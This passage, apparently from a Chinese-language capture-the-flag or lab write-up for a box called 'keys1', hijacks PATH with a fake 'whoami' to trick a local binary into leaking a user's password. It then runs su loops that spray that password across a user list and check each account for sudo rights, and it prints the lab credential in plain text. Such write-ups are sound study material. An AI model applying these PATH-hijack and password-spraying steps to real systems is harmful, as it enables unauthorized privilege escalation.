-p是在干嘛没有搞懂，但是下面提示了会循环查询前面找到的user.txt并于当前用户对比

![image-20260227013007432](/assets/img/posts/keys1/image-20260227013007432.png)

问题就在于怎么伪造当前用户，当前用户大概率是 `whoami` 查询到的，如果我把whoami改成输出指定用户呢

```bash
cd /tmp
echo "echo jojo" > whoami
chmod +x whoami
export PATH=/tmp:$PATH
/usr/local/bin/key1
```

用户权限 `sublarge:9cesSxZfHJS8DNxieFUx`

![image-20260227012920830](/assets/img/posts/keys1/image-20260227012920830.png)

```bash
echo "echo root" > whoami
chmod +x whoami
export PATH=/tmp:$PATH
/usr/local/bin/key1
```

好吧，果然相同的方法不能成功

这就很诡异了，明明我都是root了，却还返回sublarge的密码，sublarge也没有sudo -l，难道还有密码复用

```bash
for u in $(cat /opt/user.txt); do echo "Trying $u"; echo "9cesSxZfHJS8DNxieFUx" | timeout 2 su $u -c "id" 2>/dev/null && echo "[+] SUCCESS: $u"; done

for u in $(cat /opt/user.txt); do 
    echo "Testing $u..."
    echo "9cesSxZfHJS8DNxieFUx" | timeout 3 su $u -c "echo '9cesSxZfHJS8DNxieFUx' | sudo -S -l" 2>/dev/null && echo "[+] SUCCESS: $u has sudo privileges!"
done
```

竟然都是同一个密码，但问题是都没有sudo的权限

这里卡了我真的特别久，直到我意识到一个问题，现在它是判断root=root了才返回sublarge的密码，而且所有普通用户密码还一样，说明程序的逻辑大概率是当前用户和用户列表的用户一样，就会返回一个“写死的用户密码”，而不是返回某个可能不存在的password.txt中用户的对应密码

![image-20260227014830985](/assets/img/posts/keys1/image-20260227014830985.png)
